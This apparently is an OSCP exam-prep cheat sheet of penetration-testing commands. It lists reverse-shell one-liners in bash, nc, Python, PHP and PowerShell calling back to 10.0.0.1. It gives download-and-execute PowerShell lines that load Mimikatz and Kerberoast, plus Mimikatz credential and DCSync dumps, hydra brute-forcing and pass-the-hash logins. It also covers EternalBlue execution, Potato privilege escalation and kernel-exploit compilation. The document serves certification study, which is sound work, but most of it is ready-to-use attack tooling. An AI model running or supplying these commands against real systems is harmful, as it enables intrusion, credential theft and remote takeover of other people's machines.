# OSCP-PWK-Notes

## Exam Proofs

Linux:

```bash
hostname
cat /path/to/flag/proof.txt
ifconfig
```

Windows:

```bash
hostname
type C:\path\to\flag\proof.txt
ipconfig
```


## Useful services

### SSHd

```bash
sudo systemctl start ssh
sudo systemctl stop ssh
```

Add this line to `/etc/ssh/ssh_config` or `/etc/ssh/sshd_config` if you are dealing with old versions of `ssh`. Running `ssh` with the `-v` option will help debug what key exchange algorithms you need.
```
KexAlgorithms diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

### Apache2

```bash

sudo systemctl start apache2
sudo systemctl stop apache2
```

Default root directory is `/var/www/html`.

## Scanning

Using `rustscan`:  
```bash
rustscan --accessible -a <target> -r 1-65535 -- -sT -sV -sC -Pn
```

Using `nmap`:  
```bash
nmap -Pn -sT -sV -sC <target>
```

Remember to perform a `UDP` scan and hopefully there is something you can use!

```bash
nmap -sU --script tftp-enum -p53,69,161 <target>
```

Using `nmapAutomator`:
```bash
./nmapAutomator.sh 10.10.10.209 All
```


## File Transfers

### HTTP

To start a `HTTP` server:
```bash
sudo python3 -m http.server 80
sudo python2 -m SimpleHTTPServer 80
sudo updog -p 80
```

To download a file:
```bash
On Linux
curl http://10.0.0.1:80/nc.exe > nc.exe
wget http://10.0.0.1:80/nc.exe -O nc.exe

On Windows:
certutil -f -split -urlcache http://10.0.0.1:80/nc.exe nc.exe
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1:80/nc.exe', 'C:\Users\root\Desktop\nc.exe')"
powershell -c "Invoke-WebRequest http://10.0.0.1:80/nc.exe -OutFile C:\Users\root\Desktop\nc.exe"
```

### SMB

To start a `SMB` server:
```bash
On Linux:
sudo smbserver.py -port 445 -smb2support share . #SMB2
sudo smbserver.py -port 445 share . #SMB1
```

To download a file:

```bash
On Windows:
copy \\10.0.0.1\share\nc.exe C:\nc.exe
\\10.0.0.1\share\whoami.exe
```

### FTP

To start a `FTP` server:
```bash
On Linux:
sudo python3 -m pyftpdlib -p 21 -w
```

To download a file:
```bash
On Windows:
ftp -A 10.0.0.1
ftp> binary
ftp> passive
```

### TFTP

To start a `TFTP` server:  
```bash
On Linux:
sudo atftpd --daemon --port 69 /tftp
```

To download a file:  
```bash
On Windows
tftp -i 10.0.0.1 GET nc.exe
```

### nc

Linux &rarr; Windows
```bash
On Linux:
cat nc.exe | nc -lvnp 1337

On Windows
nc 10.0.0.1 1337 > nc.exe
```

Windows &rarr; Linux
```bash
On Linux:
nc 10.0.0.1 1337 < nc.exe

On Windows
nc -lvnp 1337 > nc.exe
```

## Reverse Shell

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### Listener
```bash
rlwrap nc -lvnp 1337
```

### Netcat/nc Traditional

```bash
nc -e /bin/sh 10.0.0.1 1337
nc -e /bin/bash 10.0.0.1 1337
nc -c /bin/bash 10.0.0.1 1337
```

### Netcat/nc OpenBSD

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1337 >/tmp/f
```

### Python

Linux:
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect(("10.0.0.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Windows:
```bash
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 1337)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

### PHP
```bash
php -r '$sock=fsockopen("10.0.0.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",1337);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",1337);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.0.0.1",1337);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",1337);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",1337);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
php -r '$sock=fsockopen("10.0.0.1",1337);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### Bash TCP

```bash
bash -i >& /dev/tcp/10.0.0.1/1337 0>&1
```

### Powershell

```bash
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 1337
```

## Powershell version

```powershell
64-bit: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
32-bit: C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe 
```

To check 32-bit/64-bit:
```powershell
[Environment]::Is64BitProcess
```

## Upgrade to Full TTY

Some commands/exploits may only work when you have full TTY.

### Socat

Attacker:
```bash
socat file:`tty`,raw,echo=0 TCP-L:1337
```

Victim:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:1337
```

### From nc

Victim:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
Ctrl-z
```

Attacker:
```bash
echo $TERM     # note down
stty -a        # note down rows and cols
stty raw -echo
fg
```

Victim:
```bash
reset
export SHELL=bash          
export TERM=xterm256-color # from "echo $TERM"
stty rows 38 columns 116   # from "stty -a"
```

## Port Enumeration

### Port 21 (FTP)

Login bruteforce:
```bash
hydra -L usernames.txt -P passwords.txt <target> ftp 
```

### Port 139/445 (SMB)

Checking for vulnerabilties:
```bash
nmap -Pn -p445 --script smb-vuln-* <target>
nmap -Pn -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version <target> # SambaCry
```

Share enumeration:
```bash
nmap -Pn -p445 --script smb-enum-shares.nse <target>    # May show path

smbmap -H <IP> [-P <PORT>]                              # Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>]  # Creds
smbmap -u "username" -p "<LM>:<NT>" -H <IP> [-P <PORT>] # Pass-the-Hash

enum4linux -a -u "<username>" -p "<password>" <IP>
```

If there is no null user, remember to try with the guest username.

Accessing share:
```bash
smbclient --no-pass -L //<IP>                              # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>  # If you omit the passwd, it will be prompted. With --pw-nt-hash, the passwd provided is the NT hash
```

If there is SMB version incompatibility, edit `/etc/samba/smb.conf` and append `min protocol = SMB1` to `[global]` seciton.    

Login bruteforce:
```bash
hydra -L usernames.txt -P passwords.txt <target> smb 
```

Getting a shell:

Using `psexec.py`:
```bash
psexec.py -hashes "<LM>:<NT>" Administrator@10.0.0.1
psexec.py Administrator:<password>@10.0.0.1
psexec.py <domain>/Administrator:<password>@10.0.0.1
```

Using `winexe`:
```bash
winexe -U Administrator%<password> //10.0.0.1 cmd.exe
```

Using `pth-winexe`:
```bash
pth-winexe -U Administrator%<LM>:<NT> //10.0.0.1 cmd.exe
```

`aad3b435b51404eeaad3b435b51404ee` is blank LM hash.

### Port 389 (LDAP)

Getting LDAP information:

```bash
ldapsearch -h <target> -p 389 -x -b "dc=htb,dc=local" 
python windapsearch.py -d htb.local -U --dc-ip <target>
```

### Port 80 (HTTP)/ 443 (HTTPS)

Web server scanning:
```bash
nikto -host http://target:80
```



Directory brute-forcing:

If there is a `/cgi-bin/` folder, try: `.cgi,.pl,.py`


```bash
gobuster dir -k -u "http://target:80/" -w /usr/share/wordlists/dirb/common.txt -t 100 -x .html,.txt,.xml,.jsp,.php,.asp

Wordlists:
1) /usr/share/wordlists/dirb/big.txt
2) /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Wordlist creation:
```bash
cewl -e -a http://target:80/ -w wordlist.txt
```

Form bruteforce:

Using `hydra`:
```bash
hydra -L usernames.txt -P passwords.txt <target> http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=300&User=^USER^&Password=^PASS^:Login Failed"
```

Using `ffuf`:
```bash
ffuf  -w /usr/share/wordlists/rockyou.txt -u http://nineveh.htb/department/login.php -X POST -d "username=admin&password=FUZZ" -fr "Invalid Password" -H "Content-Type: application/x-www-form-urlencoded" -t 100        
```

Testing for shellshock:

```bash
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
```

Testing for heartbleed:

```bash
nmap -p 443 --script ssl-heartbleed <target>
```

### Port 3306 (MySQL)

Login bruteforce:
```bash
hydra -L usernames.txt -P passwords.txt <target> mysql
```

Accessing:
```bash
mysql -h <target> -uroot -ptoor
```

### Port 5985 (WinRM)

Getting a shell:
```bash
evil-winrm -i <target> -u <username> -p <password>
evil-winrm -i <target> -u <username> -H <NT hash>
```

Login bruteforce:
```bash 
git clone https://github.com/mchoji/winrm-brute
cd winrm-brute
bundle config path vendor/bundle
bundle install
bundle exec ./winrm-brute.rb -U users.txt -P passwords.txt 10.0.0.1
```

### Port 1433 (MSSQL)

Accessing:
```bash
sqsh -S <target>:1433 -U sa
```

## Privilege Escalation

### [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

#### [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases)

```bash
winPEASany.exe
winPEAS.bat
```

#### [Seatbelt](https://raw.githubusercontent.com/r3motecontrol/Ghostpack-CompiledBinaries/master/Seatbelt.exe)

```bash
Seatbelt.exe -group=system
Seatbelt.exe -group=user
Seatbelt.exe -group=misc
Seatbelt.exe -group=all -full
```

#### [Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)

```bash
Import-Module .\Sherlock.ps1; Find-AllVulns
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Sherlock.ps1'); Find-AllVulns
```

#### [Powerless](https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat)

```bash
Powerless.bat
```

#### [Mimikatz](https://github.com/gentilkiwi/mimikatz)

```bash
mimikatz.exe
mimikatz.exe "privilege::debug token::elevate lsadump::sam exit"
mimikatz.exe "privilege::debug token::elevate lsadump::secrets exit"
mimikatz.exe "privilege::debug token::elevate lsadump::cache exit"
mimikatz.exe "privilege::debug token::elevate sekurlsa::logonpasswords exit"
mimikatz.exe "privilege::debug token::elevate vault::cred /patch exit"
mimikatz.exe "privilege::debug token::elevate lsadump::dcsync /user:domain\krbtgt /domain:lab.local exit"
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds
```

#### [Kerberoast](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)

```bash
Import-Module .\Invoke-Kerberoast.ps1; Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat
```

#### [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

```bash
windows-exploit-suggester.py --update
systeminfo > systeminfo.txt
windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
```

#### [Windows Exploit Suggester NG](https://github.com/bitsadmin/wesng)

```bash
wes.py --update
systeminfo > systeminfo.txt
wes.py systeminfo.txt
```

### [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

#### [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh)

```bash
./lse.sh -l 1 -i
```

#### [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

```bash
./LinEnum.sh
```

#### [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)

```bash
./linpeas.sh
```

#### [SUDO_Killer](https://github.com/TH3xACE/SUDO_KILLER)

```bash
./extract.sh
./sudo_killer.sh -c -i /path/sk_offline.txt
```

#### [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh)

```bash
./linux-exploit-suggester.sh -k 3.2.0
```

#### [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl)

```bash
./linux-exploit-suggester.pl -k 3.2.0
```

## Port-Forwarding

### Local SSH Forwarding

If a service is only exposed on a host in another network and you want to make it accessible on a local port,

```bash
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER
```

### Remote SSH Forwarding

If a service is only exposed on a host in another network and you want to make it accessible on a local port,

Using `ssh`:
```bash
ssh -R 3306:127.0.0.1:3306 user@SSH_SERVER
```

Using `plink.exe`:
```bash
plink.exe -l root -pw root 10.10.XX.XX -R 445:127.0.0.1:445 -P 2222
```

## Compiling Exploits

```bash
gcc -pthread dirty.c -o dirty -lcrypt                 # Dirty Cow
i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32 # 'afs.sys' 
gcc -m32 -Wl,--hash-style=both 9542.c -o 9542         # 'ip_append_data()
```

## Useful tools

### `JuicyPotato`:

Requires `SeAssignPrimaryTokenPrivilege` and `SeImpersonatePrivilege`

```bash
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\reverse.exe" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

Get `CLSID` from [here](https://ohpe.it/juicy-potato/CLSID/)

### `RoguePotato`:

Requires `SeAssignPrimaryTokenPrivilege` and `SeImpersonatePrivilege`

For Windows Server 2019 and Windows 10.

Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:
```bash
$ sudo socat tcp-listen:135,reuseaddr,fork tcp:<target>:9999
```

Run the `RoguePotato` exploit:

```bash
RoguePotato.exe -r <attacker> -e "C:\PrivEsc\reverse.exe" -l 9999
```

### `PrintSpoofer`:

Requires `SeImpersonatePrivilege`

Windows 8.1, Windows Server 2012 R2, Windows 10 and Windows Server 2019

```bash
PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

### `EternalBlue`:

```bash
python eternalblue/checker.py legacy.htb
python eternalblue/send_and_execute.py legacy.htb reverse.exe 445 <pipe>
```

### `MSFVenom`:


## Static Binaries

https://github.com/ernw/static-toolbox

https://github.com/ZephrFish/static-tools

https://github.com/andrew-d/static-binaries

https://github.com/interference-security/kali-windows-binaries

https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

## Compiled Exploits

https://github.com/SecWiki/windows-kernel-exploits

https://github.com/SecWiki/linux-kernel-exploits

https://github.com/abatchy17/WindowsExploits

## Useful Exploits

[Windows XP SP0/SP1 Privilege Escalation to System](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)

[Bypassing default UAC settings manually](https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/)

[MS17-010/Eternal Blue](https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py)

[Ghostcat](https://github.com/dacade/CVE-2020-1938)

[SMTP Shellshock](https://gist.github.com/claudijd/33771b6c17bc2e4bc59c)

[SambaCry](https://github.com/joxeankoret/CVE-2017-7494)

[Samba Symlink Traversal](https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually)

## References

https://github.com/tbowman01/OSCP-PWK-Notes-Public

https://github.com/swisskyrepo/PayloadsAllTheThings

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-3-upgrading-from-netcat-with-magic

https://book.hacktricks.xyz/

https://github.com/frizb/Hydra-Cheatsheet

## Tools list (`install.sh`)

### General

| Toolname          | Location                       | Installed  |
| ----------------- | ------------------------------ | ---------- |
| `docker-ce`       | -                              | Yes        |
| `rlwrap`          | -                              | Yes        |
| `code`            | -                              | Yes        |
| `openjdk-11-jdk`  | -                              | Yes        |
| `gdb`             | -                              | Yes        |
| `pip2`            | -                              | Yes        |
| `pip3`            | -                              | Yes        |
| `updog`           | -                              | Yes        |
| `volatility`      | `~/Desktop/tools/volatility3`  | Yes        |
| `ghidra`          | `~/Desktop/tools/ghidra`       | Yes        |
| `sysinternals`    | `~/Desktop/tools/sysinternals` | Yes        |
| `pwntools`        | -                              | Yes        |
| `z3-solver`       | -                              | Yes        |
| `randcrack`       | -                              | Yes        |

### Shell

| Toolname          | Location                    | Installed  |
| ----------------  | --------------------------- | ---------- |
| `rlwrap`          | -                           | Yes        |
| `telnet`          | -                           | Yes        |
| `evil-winrm`      | -                           | Yes        |
| `msfpc`           | `~/Desktop/tools/msfpc`     | Yes        |
| `rsg`             | `~/Desktop/tools/rsg`       | Yes        |


### Web

| Toolname          | Location                   | Installed  |
| ----------------  | -------------------------- | ---------- |
| `gobuster`        | -                          | Yes        |
| `ffuf`            | -                          | Yes        |
| `seclists`        | `~/Desktop/tools/seclists` | Yes        |
| `mariadb-client`  | -                          | Yes        |
| `feroxbuster`     | -                          | Yes        |

### Compilation 

| Toolname          | Location                   | Installed  |
| ----------------  | -------------------------- | ---------- |
| `cmake`           | -                          | Yes        |
| `mingw-w64`       | -                          | Yes        |


### Brute-force

| Toolname          | Location                   | Installed  |
| ----------------- | -------------------------- | ---------- |
| `crowbar`         | -                          | Yes        |


### Recon

| Toolname          | Location                   | Installed  |
| ----------------- | -------------------------- | ---------- |
| `rustscan`        | -                          | Yes        |
| `AutoRecon`       | -                          | Yes        |
| `nmapAutomator`   | -                          | Yes        |

### Windows Enumeration

| Toolname                    | Location                                    | Installed  |
| -----------------           | ------------------------------------------- | ---------- |
| `Sherlock`                  | `~/Desktop/web/sherlock.ps1`                | Yes        |
| `Empire`                    | `~/Desktop/tools/Empire`                    | Yes        |
| `wesng`                     | `~/Desktop/tools/wesng`                     | Yes        |
| `Windows-Exploit-Suggester` | `~/Desktop/tools/Windows-Exploit-Suggester` | Yes        |
| `Powerless`                 | `~/Desktop/web/powerless.bat`               | Yes        |
| `Seatbelt`                  | `~/Desktop/web/seatbelt.exe`                | Yes        |
| `Powerview`                 | `~/Desktop/web/powerview.ps1`               | Yes        |
| `winPEAS`                   | `~/Desktop/web/winpeasany.exe`              | Yes        |
| `nishang`                   | `~/Desktop/tools/nishang`                   | Yes        |
| `juicypotato x64`           | `~/Desktop/web/juicypotato.exe`             | Yes        |
| `roguepotato`               | `~/Desktop/web/roguepotato.exe`             | Yes        |


### Linux Enumeration

| Toolname                  | Location                                  | Installed  |
| ------------------------- | ----------------------------------------- | ---------- |
| `sudo_killer`             | `~/Desktop/tools/SUDO_KILLER`             | Yes        |
| `linux-exploit-suggester` | `~/Desktop/tools/linux-exploit-suggester` | Yes        |
| `LinEnum.sh`              | `~/Desktop/web/linenum.sh`                | Yes        |
| `linux-smart-enumeration` | `~/Desktop/web/lse.sh`                    | Yes        |
| `linPEAS`                 | `~/Desktop/web/linpeas.sh`                | Yes        |


### Exploits

| Toolname                  | Location                                  | Installed  |
| ------------------------- | ----------------------------------------- | ---------- |
| `eternalblue`             | `~/Desktop/exploits/eternablue`           | Yes        |
| `sambacry`                | `~/Desktop/exploits/sambacry`             | Yes        |
| `ghostcat`                | `~/Desktop/exploits/ghostcat`             | Yes        |
| `postfix shellshock`      | `~/Desktop/exploits/postfix_shellshock`   | Yes        |
| `xploit_installer`        | `~/Desktop/exploits/xploit_installer`     | Yes        |

### Compiled Binaries

| Toolname                  | Location                                  | Installed  |
| ------------------------- | ----------------------------------------- | ---------- |
| `windows-binaries`        | `~/Desktop/tools/windows-binaries`        | Yes        |
| `static-binaries`         | `~/Desktop/exploits/static-binaries`      | Yes        |